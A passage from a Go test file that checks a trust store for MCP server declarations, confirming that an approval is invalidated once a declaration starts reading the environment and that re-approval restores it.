	if err := os.WriteFile(filepath.Join(home, TrustFileName), data, 0o600); err != nil {
		t.Fatal(err)
	}
	store := NewTrustStore(home)
	if store.Approved(ws, reader) {
		t.Fatal("an approval given before the declaration could read the environment still admits it")
	}
	if !store.Approved(ws, plain) {
		t.Fatal("a receipt of a declaration that reads nothing must stay good")
	}
	// Approved again, it is.
	if err := store.Approve(ws, config.MCPJSONPath(ws), reader); err != nil {
		t.Fatal(err)
	}
	if !store.Approved(ws, reader) {
		t.Fatal("a fresh approval must admit the reader")
	}
}
